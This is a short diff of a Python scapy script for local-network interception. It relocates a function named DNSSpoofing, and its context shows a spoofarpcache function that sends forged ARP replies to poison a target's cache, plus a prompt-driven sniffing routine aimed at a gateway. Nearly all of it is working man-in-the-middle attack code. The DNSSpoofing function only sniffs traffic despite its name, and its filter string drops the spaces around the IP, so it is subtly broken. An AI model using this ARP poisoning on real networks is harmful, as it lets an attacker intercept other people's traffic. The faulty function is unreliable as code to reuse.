@@ -4,6 +4,10 @@ from scapy.sendrecv import send, sniff
 def spoofarpcache(targetip, targetmac, sourceip):
 	send(ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac), verbose=False)
 
+def DNSSpoofing(iptarget):
+   a = sniff(filter="host"+iptarget+"and dns")
+   a.nsummary()
+
 def restorearp(targetip, targetmac, sourceip, sourcemac):
 	packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
 	send(packet, verbose=False)
@@ -46,7 +50,4 @@ else :
     ippasserelle = input("Which ip passerelle :")
     MultiSniffing(ippasserelle)
 
-def DNSSpoofing(iptarget):
-   a = sniff(filter="host"+iptarget+"and dns")
-   a.nsummary()
 
